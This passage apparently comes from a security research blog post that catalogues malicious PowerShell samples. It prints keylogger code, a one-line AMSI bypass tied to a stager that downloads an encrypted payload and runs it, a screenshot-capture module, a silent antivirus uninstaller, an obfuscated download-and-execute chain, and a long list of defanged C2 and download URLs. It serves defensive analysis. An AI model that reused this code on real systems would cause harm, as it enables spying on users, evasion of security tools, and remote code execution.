($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000) -eq 0x8000\n$SpaceBar     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000) -eq 0x8000\n$DeleteKey    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000\n$EnterKey     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000\n$BackSpaceKey = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000\n$LeftArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000\n$RightArrow   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000\n$UpArrow      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000\n$DownArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000\n$LeftMouse    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000\n$RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000\n \nif ($LeftShift -or $RightShift) {$LogOutput += '[Shift]'}\nif ($LeftCtrl  -or $RightCtrl)  {$LogOutput += '[Ctrl]'}\nif ($LeftAlt   -or $RightAlt)   {$LogOutput += '[Alt]'}\nif ($TabKey)       {$LogOutput += '[Tab]'}\nif ($SpaceBar)     {$LogOutput += '[SpaceBar]'}\nif ($DeleteKey)    {$LogOutput += '[Delete]'}\nif ($EnterKey)     {$LogOutput += '[Enter]'}\nif ($BackSpaceKey) {$LogOutput += '[Backspace]'}\nif ($LeftArrow)    {$LogOutput += '[Left Arrow]'}\nif ($RightArrow)   {$LogOutput += '[Right Arrow]'}\nif ($UpArrow)      {$LogOutput += '[Up Arrow]'}\nif ($DownArrow)    {$LogOutput += '[Down Arrow]'}\nif ($LeftMouse)    {$LogOutput += '[Left Mouse]'}\nif ($RightMouse)   {$LogOutput += '[Right Mouse]'}\n\nFunction DynAKey \u2013\n$LeftShift = $ImportDll::GetAsyncKeyState(160)\n$RightShift = $ImportDll::GetAsyncKeyState(161)\n$LeftCtrl = $ImportDll::GetAsyncKeyState(162)\n$RightCtrl = $ImportDll::GetAsyncKeyState(163)\n$LeftAlt = $ImportDll::GetAsyncKeyState(164)\n$RightAlt = $ImportDll::GetAsyncKeyState(165)\n$TabKey = $ImportDll::GetAsyncKeyState(9)\n$SpaceBar = $ImportDll::GetAsyncKeyState(32)\n$DeleteKey = $ImportDll::GetAsyncKeyState(127)\n$EnterKey = $ImportDll::GetAsyncKeyState(13)\n$BackSpaceKey = $ImportDll::GetAsyncKeyState(8)\n$LeftArrow = $ImportDll::GetAsyncKeyState(37)\n$RightArrow = $ImportDll::GetAsyncKeyState(39)\n$UpArrow = $ImportDll::GetAsyncKeyState(38)\n$DownArrow = $ImportDll::GetAsyncKeyState(34)\n$LeftMouse = $ImportDll::GetAsyncKeyState(1)\n$RightMouse = $ImportDll::GetAsyncKeyState(2)\n\nif ((($LeftShift -eq -32767) -or ($RightShift -eq -32767)) -or (($LeftShift -eq -32768) -or ($RightShfit -eq -32768))) {$LogOutput += '[Shift] '}\nif ((($LeftCtrl -eq -32767) -or ($LeftCtrl -eq -32767)) -or (($RightCtrl -eq -32768) -or ($RightCtrl -eq -32768))) {$LogOutput += '[Ctrl] '}\nif ((($LeftAlt -eq -32767) -or ($LeftAlt -eq -32767)) -or (($RightAlt -eq -32767) -or ($RightAlt -eq -32767))) {$LogOutput += '[Alt] '}\nif (($TabKey -eq -32767) -or ($TabKey -eq -32768)) {$LogOutput += '[Tab] '}\nif (($SpaceBar -eq -32767) -or ($SpaceBar -eq -32768)) {$LogOutput += '[SpaceBar] '}\nif (($DeleteKey -eq -32767) -or ($DeleteKey -eq -32768)) {$LogOutput += '[Delete] '}\nif (($EnterKey -eq -32767) -or ($EnterKey -eq -32768)) {$LogOutput += '[Enter] '}\nif (($BackSpaceKey -eq -32767) -or ($BackSpaceKey -eq -32768)) {$LogOutput += '[Backspace] '}\nif (($LeftArrow -eq -32767) -or ($LeftArrow -eq -32768)) {$LogOutput += '[Left Arrow] '}\nif (($RightArrow -eq -32767) -or ($RightArrow -eq -32768)) {$LogOutput += '[Right Arrow] '}\nif (($UpArrow -eq -32767) -or ($UpArrow -eq -32768)) {$LogOutput += '[Up Arrow] '}\nif (($DownArrow -eq -32767) -or ($DownArrow -eq -32768)) {$LogOutput += '[Down Arrow] '}\nif (($LeftMouse -eq -32767) -or ($LeftMouse -eq -32768)) {$LogOutput += '[Left Mouse] '}\nif (($RightMouse -eq -32767) -or ($RightMouse -eq -32768)) {$LogOutput += '[Right Mouse] '}\n\nOther Techniques\n\nAMSI Bypass (8 Samples \u2013 0.20% Coverage)\n\nAntimalware Scan Interface (AMSI) is a new feature Microsoft released in Windows 10 and is designed to facilitate communication between applications and AV products. Ideally, the application (PowerShell in this context) will take the script at runtime, after it\u2019s deobfuscated or pulled in remotely from a website, and pass it through AMSI to your AV for scanning. If the AV software determines it\u2019s malicious, it can now block the scripts execution.\n\n#YAOMG (Yet Another of Matt Graebers)\n\nMatt Graeber released a one-line tweet\u00a0 that shows how you can bypass AMSI by simply changing \u201camsiInitFailed\u201d to \u201cTrue\u201d, which makes it appear as if it failed to load and effectively skips this check.\n[ReF].ASSEmbly.GetTYpe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIElD('amsiInitFailed','NonPublic,Static').SetVAlue($Null,$True)};[SySteM.Net.SErviCEPOINTMaNAger]::ExPeCt100ConTinue=0;$wC=NEW-OBjEcT System.NET.WebClieNt;$u='Mozilla\/5.0 (Windows NT 6.1; WOW64; Trident\/7.0; rv:11.0) like Gecko';$Wc.HEAdERs.ADD('User-Agent',$u);$wC.PRoxY=[SYStEm.NET.WEBREQuEst]::DeFaUlTWEbProXY;$Wc.ProXY.CREDenTIALs = [SYSteM.NEt.CReDentIalCAcHe]::DeFAulTNetwORKCREdEntialS;$K=[SySTEm.TexT.EncodING]::ASCII.GETBYteS('Dv,inKZ&lt;@{3mjG4&amp;1k:Vcl7o)EY*J?6x');$R={$D,$K=$ArGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-Bxor$S[($S[$I]+$S[$H])%256]}};$Wc.HEaDERs.ADD(\"Cookie\",\"session=Pu8sEnIpxIwINbUOVsxlL66DoHA=\");$ser='http:\/\/35.165.38[.]15:80';$t='\/login\/process.php';$dATa=$WC.DowNLOadDAtA($ser+$T);$IV=$DaTA[0..3];$Data=$DaTa[4..$DAtA.leNgTH];-JoIn[CHAr[]](&amp; $R $data ($IV+$K))|IEX\n\nThe code shares a similar signature to PowerShell Empire\u2019s XOR routine for their EncryptedScriptDropper and may be related or borrowed code.\n\nPowerSploit GTS (3 Samples \u2013 0.07% Coverage)\n\nThis is set of samples that simply use a module from another tool, in this case, the PowerSploit Get-TimedScreenshot. The code will take a screenshot using Drawing.Bitmap every 2 seconds.\nfunction Get-TimedScreenshot\n{\n    [CmdletBinding()] Param(\n        [Parameter(Mandatory=$True)]\n        [ValidateScript({Test-Path -Path $_ })]\n        [String] $Path,\n\n        [Parameter(Mandatory=$True)]\n        [Int32] $Interval,\n\n        [Parameter(Mandatory=$True)]\n        [String] $EndTime\n    )\n\n    Function Get-Screenshot {\n       $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen\n       $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height\n       $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)\n       $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)\n       $DrawingGraphics.Dispose()\n       $ScreenshotObject.Save($FilePath)\n       $ScreenshotObject.Dispose()\n    }\n\n    Try {\n\n        #load required assembly\n        Add-Type -Assembly System.Windows.Forms\n\n        Do {\n            #get the current time and build the filename from it\n            $Time = (Get-Date)\n\n            [String] $FileName = \"$($Time.Month)\"\n            $FileName += '-'\n            $FileName += \"$($Time.Day)\"\n            $FileName += '-'\n            $FileName += \"$($Time.Year)\"\n            $FileName += '-'\n            $FileName += \"$($Time.Hour)\"\n            $FileName += '-'\n            $FileName += \"$($Time.Minute)\"\n            $FileName += '-'\n            $FileName += \"$($Time.Second)\"\n            $FileName += '.png'\n\n            [String] $FilePath = (Join-Path $Path $FileName)\n            Get-Screenshot\n\n            Start-Sleep -Seconds $Interval\n        }\n\n        While ((Get-Date -Format HH:mm) -lt $EndTime)\n    }\n\n    Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}\n}\n\nGet-TimedScreenshot -Path \"$env:userprofile\\Desktop\" -Interval 2 -EndTime 24:00\n\nFor these types of attacks, the PowerShell code is just an augmentation to the overarching suite of tools being used in the attack, likely intended to save the attacker time in developing the desired functionality. In this case, Microsoft Excel documents contained macros that first launch a function to decode the PowerShell code and begin taking screenshots while a second function is called afterwards to decode a PE file that handles the rest of the attack.\n\n\n\nFigure 7 Excel Macro decodes embedded Powershell script and PE file.\n\nRemove AV (2 Samples \u2013 0.05% Coverage)\n\nThis next variant uses PowerShell to forcefully uninstall both x86 and x64 versions of an installed AV application. It iterates over entries in the Uninstall registry path to find items with \u201c*AVG*\u201d and then quietly uninstalls each instance.\n$uninstall32s = gci \"HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" | foreach { gp $_.PSPath } | ? { $_ -like \"*AVG*\" } | select UninstallString;$uninstall64s = gci \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" | foreach { gp $_.PSPath } | ? { $_ -like \"*AVG*\" } | select UninstallString;foreach($uninstall64 in $uninstall64s) {$uninstall64 = $uninstall64.UninstallString -Replace \"MsiExec.exe\",\"\" -Replace \"\/I\",\"\" -Replace \"\/X\",\"\";$uninstall64 = $uninstall64.Trim();if($uninstall64 -like \"*\/mode=offline*\"){}else{Write-Warning $uninstall64; start-process \"msiexec.exe\" -args \"\/x $uninstall64  \/qn \/norestart\" -Wait }};foreach($uninstall32 in $uninstall32s) {$uninstall32 = $uninstall32.UninstallString -Replace \"MsiExec.exe\",\"\" -Replace \"\/I\",\"\" -Replace \"\/X\",\"\";$uninstall32 = $uninstall32.Trim();if($uninstall32 -like \"*\/mode=offline*\"){}else{Write-Warning $uninstall32; start-process \"msiexec.exe\" -args \"\/x $uninstall32  \/qn \/norestart\" -Wait }};\n\nNotable One-Offs\n\nAfter identifying as many variants as possible, I was left with around 100 \u201cUnknown\u201d samples, which were usually custom spins on the techniques described above. I\u2019ll end this cataloging with a quick overview of some of the more notable samples.\n\nHidden Messages\n\nThis sample does some basic date checking through PowerShell and compares current datetime to an included datetime, if the current datetime is past the included one, it will not run. At the end of the code though, they leave a commented call-out to, possibly, their \u201chacking\u201d group.\nif ((Get-Date).Ticks -lt (Get-Date -Date '18-jan-2017 00:00:00').Ticks) {(New-Object System.Net.WebClient).DownloadFile('http:\/\/drobbox-api.dynu[.]com\/update',\"$env:temp\\update\");Start-Process pythonw.exe \"$env:temp\\update 31337\"};#NIXU17{pow3r_t0_the_sh3lls}\n\nAnother example of leaving hidden messages is in the sample below.\nwhile($true){Start-Sleep -s 120; $m=New-Object System.Net.WebClient;$pr = [System.Net.WebRequest]::GetSystemWebProxy();$pr.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$m.proxy=$pr;$m.UseDefaultCredentials=$true;$m.Headers.Add('user-agent', 'Mozilla\/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident\/5.0)'); iex(($m.downloadstring('https:\/\/raw.githubusercontent.com\/rollzedice\/js\/master\/drupal.js')));}\n\nWhen you analyze the code it pulls down remotely from GitHub, which at the time of this writing kills PowerShell processes, it says \u201cHello SOC\/IR team!\u00a0 :-)\u201d. It\u2019s possible this is just a pentest or red-team exercise given the history of the file using \u201cTest\u201d a lot.\n\n\n\nFigure 8 JavaScript file kills powershell and greets SOC\/IR team.\n\nProcess Killing\n\nThis is another example of using PowerShell for specific purposes in an overarching attack. It will kill a number of processes typically associated with malware analysis.\nkill -processname Taskmgr, ProcessHacker*, Procmon*, Procexp*, Procdump* -force\n\nLayers of Obfuscation\n\nFor this last example, it appears to be related to the samples shown in the \u201cPowerSploit GTS\u201d variants, as the originating macros are almost identical, but this sample did not use any of the other pieces.\n\nThis particular sample uses multiple layers of obfuscation to carry out its attack.\n\nLayer 1 \u2013\n\nA Microsoft Excel document has a macro that pulls a base64 encoded data from a cell that is passes to PowerShell\u2019s EncodedCommand parameter when it launches.\n\n\n\nLayer 2 \u2013\n\nThe decoded base64 is a long array of int values that get converted to their char value, and then executed as another PowerShell script.\n-JOIn (( 32 ,32 , 36 ,86 ,115 , 110 , 50,108 , 54, 32 ,61 , 32,32 , 91,116,121,112,101, 93 ,40 ,34,123 ,51 , 125 , 123, 48 ,125, 123, 49, 125, ,53, 45 ,49, 54,55 , 45,39, 44 ,39 ,101 , 46 , 97, 109, 97 , 122 ,111,110 ,97, 39, 44, 39 ,53,39, 44,39, 119 , 115, 46, 99 , 111 , 109 ,58, 56 , 48 , 39 ,44 ,39,45 , 119, 101 ,115 , 39,41, 41 , 59)|%{([inT]$_-AS [chAr]) } ) | iex\n\nLayer 3 \u2013\n\nThe decoded data uses various techniques to obfuscate itself. The first technique is injecting backtick characters between other characters, which will be ignored at runtime. This is similar to the caret injection technique from the command-line, but works within the PowerShell code instead.\n\nIt also uses a technique commonly seen in other scripting languages by breaking up a string into a randomized list and then rebuilding the original string by calling specific values.\n$Vsn2l6 =  [type](\"{3}{0}{1}{2}\" -F\\'UE\\',\\'S\\',\\'t\\',\\'Net.webreq\\') ;  $h69Q4  =[TYPe](\"{1}{2}{3}{4}{0}\"-F \\'he\\',\\'nEt.C\\',\\'REDeNtialC\\',\\'a\\',\\'c\\') ;  ${J}=&amp;(\"{0}{1}{2}\"-f \\'new-obj\\',\\'ec\\',\\'t\\') (\"{2}{1}{0}{3}\" -f \\'eb\\',\\'.w\\',\\'net\\',\\'client\\');${j}.\"PRo`XY\"=  ( VaRIablE  vsn2L6 ).VaLuE::(\"{0}{3}{2}{4}{1}\"-f\\'GetS\\',\\'Proxy\\',\\'em\\',\\'yst\\',\\'Web\\').Invoke();${j}.\"pr`OXY\".\"C`RE`De`NTiALs\"= (  GeT-VariaBle  H69Q4).VaLUe::\"DE`Faultcred`en`TI`ALS\";.(\"{0}{1}\"-f \\'I\\',\\'EX\\') ${J}.(\"{1}{3}{2}{0}\" -f \\'string\\',\\'do\\',\\'load\\',\\'wn\\').Invoke((\"{3}{1}{9}{11}{8}{13}{0}{4}{15}{5}{10}{2}{12}{14}{7}{6}\" -f\\'5\\',\\'tp:\/\/\\',\\'mput\\',\\'ht\\',\\'.us\\',\\'t\\',\\'0\/anSfrf\\',\\'8\\',\\'185-\\',\\'e\\',\\'-2.co\\',\\'c2-35-167-\\',\\'e.amazona\\',\\'5\\',\\'ws[.]com:80\\',\\'-wes\\'));\n\nCleaning up the code and building the strings shows that it downloads code remotely to pass to Invoke-Expression.\n$Vsn2l6 = [type]Net.webreqUESt;\n$h69Q4 = [TYPe]nEt.CREDeNtialCache;\n&amp;new-object net.webclient;\nPRoXY\t= $Vsn2l6.VaLuE::GetSystemWebProxy.Invoke();\nprOXY.CREDeNTiALs = ( GeT-VariaBle $h69Q4 ).VaLUe::DEFaultcredenTIALS;\n.IEX downloadstring.Invoke(http:\/\/ec2-35-167-185-55.us-west-2.compute.amazonaws[.]com:8080\/anSfrf);\n\nConclusion\nPowerShell is a robust scripting framework that offers a lot of capabilities, both for defense and offense. Hopefully this blog has served to highlight some of the current techniques being used in tools and attacks.\n\nAcross these samples, it seems clear that the majority of attacks are still relying on public tools, which isn\u2019t surprising. As the PowerShell framework continues to be explored and matured, I suspect we will begin to see a lot more variation in attacks coming from this space. As it stands today, PowerShell seems to be mainly used as a tool to facilitate common functions attackers are used to within other frameworks, but will eventually start to take advantage of more native features once we move out of the \u201ctransference\u201d phase to an \u201cinnovative\u201d phase.\nObserved C2 or Download Sites\nDownloader DFSP\n675\thxxp:\/\/94[.]102.53.238\/~yahoo\/csrsv.exe\n244\thxxp:\/\/89[.]248.170.218\/~yahoo\/csrsv.exe\n132\thxxp:\/\/94[.]102.58.30\/~trevor\/winx64.exe\n70\thxxp:\/\/80[.]82.64.45\/~yakar\/msvmonr.exe\n24\thxxp:\/\/89[.]248.166.140\/~zebra\/iesecv.exe\n18\thxxp:\/\/cajos[.]in\/0x\/1.exe\n14\thxxp:\/\/93[.]174.94.137\/~karma\/scvhost.exe\n6\thxxp:\/\/ddl7[.]data.hu\/get\/0\/9507148\/Patload.exe\n5\thxxp:\/\/nikil[.]tk\/p1\/Pa_001.exe\n5\thxxp:\/\/185[.]45.193.17\/update.exe\n5\thxxp:\/\/185[.]141.27.28\/update.exe\n4\thxxps:\/\/a[.]pomf.cat\/xsakpo.exe\n4\thxxp:\/\/185[.]141.27.35\/update.exe\n3\thxxp:\/\/www[.]macwizinfo.com\/updates\/anna.exe\n3\thxxp:\/\/worldnit[.]com\/opera.exe\n3\thxxp:\/\/doc[.]cherrycoffeeequipment.com\/nw\/logo.png\n3\thxxp:\/\/185[.]141.25.142\/update.exe\n3\thxxp:\/\/185[.]117.75.43\/update.exe\n3\thxxp:\/\/185[.]106.122.64\/update.exe\n2\thxxp:\/\/185[.]141.25.243\/file.exe\n2\thxxp:\/\/185[.]141.27.32\/update.exe\n2\thxxp:\/\/185[.]141.27.34\/update.exe\n2\thxxp:\/\/andersonken4791[.]pserver.ru\/doc.exe\n2\thxxp:\/\/boisedelariviere[.]com\/backup\/css\/newconfig.exe\n2\thxxp:\/\/brokelimiteds[.]in\/wp-admin\/css\/upload\/Order.exe\n2\thxxp:\/\/ddl7[.]data.hu\/get\/0\/9499830\/money.exe\n2\thxxp:\/\/fetzhost[.]net\/files\/044ae4aa5e0f2e8df02bd41bdc2670b0.exe\n2\thxxp:\/\/hnng[.]moe\/f\/InX\n2\thxxp:\/\/hnng[.]moe\/f\/Iot\n2\thxxp:\/\/labid[.]com.my\/m\/m1.exe\n2\thxxp:\/\/labid[.]com.my\/power\/powex.exe\n2\thxxp:\/\/labid[.]com.my\/spe\/spendy.exe\n2\thxxp:\/\/lvrxd[.]3eeweb.com\/nano\/Calculator.exe\n2\thxxp:\/\/matkalv[.]5gbfree.com\/loso\/fasoo.exe\n2\thxxp:\/\/net[.]gethost.pw\/windro.exe\n2\thxxp:\/\/nikil[.]tk\/i1\/iz_001.exe\n2\thxxp:\/\/rgho[.]st\/68lJcGFLW\n2\thxxp:\/\/rgho[.]st\/6hrkjYlX4\n2\thxxp:\/\/toxicsolutions[.]ru\/upload\/praisefud.exe\n2\thxxp:\/\/worldnit[.]com\/KUKU.exe\n2\thxxp:\/\/worldnit[.]com\/kundelo.exe\n2\thxxp:\/\/worldnit[.]com\/operamini.exe\n2\thxxp:\/\/www[.]wealthandhealthops.com\/modules\/mod_easyblogquickpost\/lawdsijdoef.exe\n2\thxxps:\/\/a[.]pomf.cat\/drktzz.exe\n2\thxxps:\/\/a[.]pomf.cat\/dwnysn.exe\n2\thxxps:\/\/a[.]pomf.cat\/dwnysn.exe\n2\thxxps:\/\/a[.]pomf.cat\/hsmqrh.exe\n2\thxxps:\/\/a[.]pomf.cat\/mjnspx.exe\n2\thxxps:\/\/a[.]pomf.cat\/pabfzv.exe\n2\thxxps:\/\/a[.]pomf.cat\/qolcls.exe\n2\thxxps:\/\/a[.]pomf.cat\/tpaesb.exe\n2\thxxps:\/\/a[.]pomf.cat\/ultxkr.exe\n2\thxxps:\/\/a[.]pomf.cat\/vhcwbo.exe\n2\thxxps:\/\/a[.]pomf.cat\/vjadwb.exe\n2\thxxps:\/\/a[.]pomf.cat\/wopkwj.exe\n2\thxxps:\/\/a[.]pomf.cat\/yspcsr.exe\n2\thxxps:\/\/www[.]dropbox.com\/s\/gx6kxkfi7ky2j6f\/Dropbox.exe?dl=1\n1\thxxp:\/\/185[.]106.122.62\/file.exe\n1\thxxp:\/\/185[.]45.193.169\/update.exe\n1\thxxp:\/\/31[.]184.234.74\/crypted\/1080qw.exe\n1\thxxp:\/\/aircraftpns[.]com\/_layout\/images\/sysmonitor.exe\n1\thxxp:\/\/allbestunlockerpro[.]com\/flash.player.exe\n1\thxxp:\/\/anonfile[.]xyz\/f\/3d0a4fb54941eb10214f3c1a5fb3ed99.exe\n1\thxxp:\/\/anonfile[.]xyz\/f\/921e1b3c55168c2632318b6d22a7bfe6.exe\n1\thxxp:\/\/brokelimiteds[.]in\/wp-admin\/css\/upload\/ken1.exe\n1\thxxp:\/\/cajos[.]in\/0x\/1.exe\n1\thxxp:\/\/danhviet[.]com.vn\/app\/p2.exe\n1\thxxp:\/\/danhviet[.]com.vn\/z\/v\/doc.exe\n1\thxxp:\/\/daratad[.]5gbfree.com\/uses\/word.exe\n1\thxxp:\/\/ddl2[.]data.hu\/get\/0\/9589621\/k000.exe\n1\thxxp:\/\/ddl3[.]data.hu\/get\/0\/9535517\/yhaooo.exe\n1\thxxp:\/\/ddl3[.]data.hu\/get\/0\/9551162\/ske.exe\n1\thxxp:\/\/ddl7[.]data.hu\/get\/0\/9552103\/PFIfdp.exe\n1\thxxp:\/\/getlohnumceders[.]honor.es\/kimt.exe\n1\thxxp:\/\/hinrichsen[.]de\/assets\/win1\/win1.exe\n1\thxxp:\/\/icbg-iq[.]com\/Scripts\/kinetics\/categories\/3rmax.exe\n1\thxxp:\/\/khoun-legal[.]com\/download\/ctob.exe\n1\thxxp:\/\/kiana[.]com\/flowplayer\/aquafresh.exe\n1\thxxp:\/\/labid[.]com.my\/power\/powex.exe\n1\thxxp:\/\/matkalv[.]5gbfree.com\/calab\/calafile.exe\n1\thxxp:\/\/matkalv[.]5gbfree.com\/noza\/odeee.exe\n1\thxxp:\/\/matkalv[.]5gbfree.com\/owee\/owe.exe\n1\thxxp:\/\/matkalv[.]5gbfree.com\/vosa\/doc.exe\n1\thxxp:\/\/nikil[.]tk\/b1\/bo_001.exe\n1\thxxp:\/\/nikil[.]tk\/k1\/ik_001.exe\n1\thxxp:\/\/sukem[.]zapto.org\/word.exe\n1\thxxp:\/\/trolda[.]5gbfree.com\/fosee\/doc.exe\n1\thxxp:\/\/worldnit[.]com\/aba.exe\n1\thxxp:\/\/worldnit[.]com\/aba.exe\n1\thxxp:\/\/worldnit[.]com\/abacoss.exe\n1\thxxp:\/\/worldnit[.]com\/abuchi.exe\n1\thxxp:\/\/worldnit[.]com\/com.exe\n1\thxxp:\/\/worldnit[.]com\/com.exe\n1\thxxp:\/\/worldnit[.]com\/compu.exe\n1\thxxp:\/\/worldnit[.]com\/comu.exe\n1\thxxp:\/\/worldnit[.]com\/firefox32.exe\n1\thxxp:\/\/worldnit[.]com\/igbo.exe\n1\thxxp:\/\/worldnit[.]com\/immo.exe\n1\thxxp:\/\/worldnit[.]com\/kele.exe\n1\thxxp:\/\/worldnit[.]com\/kelle.exe\n1\thxxp:\/\/worldnit[.]com\/kells.exe\n1\thxxp:\/\/worldnit[.]com\/kuku.exe\n1\thxxp:\/\/worldnit[.]com\/nigga.exe\n1\thxxp:\/\/worldnit[.]com\/nigga.exe\n1\thxxp:\/\/worldnit[.]com\/office.exe\n1\thxxp:\/\/worldnit[.]com\/pony.exe\n1\thxxp:\/\/worldnit[.]com\/seccrypt.exe\n1\thxxp:\/\/worldnit[.]com\/sect.exe\n1\thxxp:\/\/www[.]athensheartcenter.com\/crm\/cgi-bin\/lnm.exe\n1\thxxp:\/\/www[.]bryonz.com\/emotions\/files\/lnwe.exe\n1\thxxp:\/\/www[.]fluidsystems.ml\/P1\/Pa_001.exe\n1\thxxp:\/\/www[.]macwizinfo.com\/updates\/eter.exe\n1\thxxp:\/\/www[.]matrimonioadvisor.it\/pariglia.exe\n1\thxxp:\/\/www[.]pelicanlinetravels.com\/images\/xvcbkty.exe\n1\thxxp:\/\/www[.]telemedia.co.za\/wp-content\/ozone\/slim.exe\n1\thxxp:\/\/www[.]wealthandhealthops.com\/modules\/mod_easybloglist\/kntgszu.exe\n1\thxxp:\/\/www[.]wvhmedicine.ru\/1\/P2.exe\n1\thxxps:\/\/1fichier[.]com\/?hfshjhm0yf\n1\thxxps:\/\/1fichier[.]com\/?v8w3g736hj\n1\thxxps:\/\/a[.]pomf.cat\/jfyywz.exe\n1\thxxps:\/\/a[.]pomf.cat\/klckcp.exe\n1\thxxps:\/\/a[.]pomf.cat\/wopkwj.exe\n1\thxxps:\/\/a[.]pomf.cat\/yhggkj.exe\n1\thxxps:\/\/dryversdocumentgritsettings[.]com\/javaupdat3s2016.exe\n1\thxxps:\/\/megadl[.]fr\/?b5r5bstqd1\n1\thxxps:\/\/srv-file1[.]gofile.io\/download\/SJLKaG\/84.200.65.20\/wscript.exe\n\nPowerShell Empire\n39\thxxp:\/\/198[.]18.133.111:8081\/index.asp\n8\thxxp:\/\/95[.]211.139.88:80\/index.asp\n5\thxxps:\/\/46[.]101.90.248:443\/index.asp\n5\thxxp:\/\/microsoft-update7[.]myvnc.com:443\/index.asp\n5\thxxp:\/\/145[.]131.7.190:8080\/index.asp\n3\thxxps:\/\/52[.]39.227.108:443\/index.asp\n3\thxxp:\/\/vanesa[.]ddns.net:443\/index.asp\n3\thxxp:\/\/polygon[.]1dn0.xyz\/index.asp\n3\thxxp:\/\/159[.]203.18.172:8080\/index.asp\n2\thxxps:\/\/dsecti0n[.]gotdns.ch:8080\/index.asp\n2\thxxps:\/\/69[.]20.66.229:9443\/index.asp\n2\thxxps:\/\/50[.]3.74.72:8080\/index.asp\n2\thxxps:\/\/205[.]232.71.92:443\/index.asp\n2\thxxp:\/\/hop[.]wellsfargolegal.com\/index.asp\n2\thxxp:\/\/ciagov[.]gotdns.ch:8080\/index.asp\n2\thxxp:\/\/chgvaswks045[.]efgz.efg.corp:888\/index.asp\n2\thxxp:\/\/ads[.]mygoogle-analytics.com:80\/index.asp\n2\thxxp:\/\/84[.]200.84.185:443\/index.asp\n2\thxxp:\/\/84[.]14.146.74:443\/index.asp\n2\thxxp:\/\/66[.]11.115.25:8080\/index.asp\n2\thxxp:\/\/64[.]137.176.174:12345\/index.asp\n2\thxxp:\/\/52[.]28.242.165:8080\/index.asp\n2\thxxp:\/\/52[.]19.131.17:80\/index.asp\n2\thxxp:\/\/23[.]239.12.15:8080\/index.asp\n2\thxxp:\/\/212[.]99.114.202:443\/count.php?user=\n2\thxxp:\/\/188[.]68.59.11:8081\/index.asp\n2\thxxp:\/\/185[.]117.72.45:8080\/index.asp\n2\thxxp:\/\/163[.]172.175.132:8089\/index.asp\n2\thxxp:\/\/159[.]203.89.248:80\/index.asp\n2\thxxp:\/\/14[.]144.144.66:8081\/index.asp\n2\thxxp:\/\/103[.]238.227.201:7788\/index.asp\n1\thxxps:\/\/www[.]enterprizehost.com:9443\/index.asp\n1\thxxps:\/\/sixeight[.]av-update.com:443\/index.asp\n1\thxxps:\/\/remote-01[.]web-access.us\/index.asp\n1\thxxps:\/\/msauth[.]net\/index.asp\n1\thxxps:\/\/metrowifi[.]no-ip.org:8443\/index.asp\n1\thxxps:\/\/megalon[.]trustwave.com:443\/index.asp\n1\thxxps:\/\/mail[.]microsoft-invites.com\/index.asp\n1\thxxps:\/\/logexpert[.]eu\/index.asp\n1\thxxps:\/\/host-101[.]ipsec.io\/index.asp\n1\thxxps:\/\/93[.]176.84.45:443\/index.asp\n1\thxxps:\/\/93[.]176.84.34:443\/index.asp\n1\thxxps:\/\/66[.]60.224.82:443\/index.asp\n1\thxxps:\/\/66[.]192.70.39:443\/index.asp\n1\thxxps:\/\/66[.]192.70.38:80\/index.asp\n1\thxxps:\/\/52[.]86.125.177:443\/index.asp\n1\thxxps:\/\/50[.]251.57.67:8080\/index.asp\n1\thxxps:\/\/46[.]101.203.156:443\/index.asp\n1\thxxps:\/\/46[.]101.185.146:8080\/index.asp\n1\thxxps:\/\/45[.]63.109.205:8443\/index.asp\n1\thxxps:\/\/172[.]30.18.11:443\/index.asp\n1\thxxps:\/\/146[.]148.58.157:8088\/index.asp\n1\thxxps:\/\/108[.]61.211.36\/index.asp\n1\thxxps:\/\/107[.]170.132.24:443\/index.asp\n1\thxxps:\/\/104[.]131.182.177:443\/index.asp\n1\thxxp:\/\/sparta34[.]no-ip.biz:443\/index.asp\n1\thxxp:\/\/securetx[.]ddns.net:3333\/index.asp\n1\thxxp:\/\/pie32[.]mooo.com:8080\/index.asp\n1\thxxp:\/\/m[.]jdirving.email:21\/index.asp\n1\thxxp:\/\/kooks[.]ddns.net:4444:4444\/index.asp\n1\thxxp:\/\/kernel32[.]ddns.net:8080\/index.asp\n1\thxxp:\/\/home[.]rzepka.se\/index.asp\n1\thxxp:\/\/192.ho4x.com:80\/index.asp\n1\thxxp:\/\/ec2-35-167-185-55[.]us-west-2.compute.amazonaws.com:443\/index.asp\n1\thxxp:\/\/amazonsdeliveries[.]com\/index.asp\n1\thxxp:\/\/ahyses[.]ddns.net:4444\/index.asp\n1\thxxp:\/\/98[.]103.103.170:80\/index.asp\n1\thxxp:\/\/98[.]103.103.168:80\/index.asp\n1\thxxp:\/\/93[.]187.43.200:80\/index.asp\n1\thxxp:\/\/84[.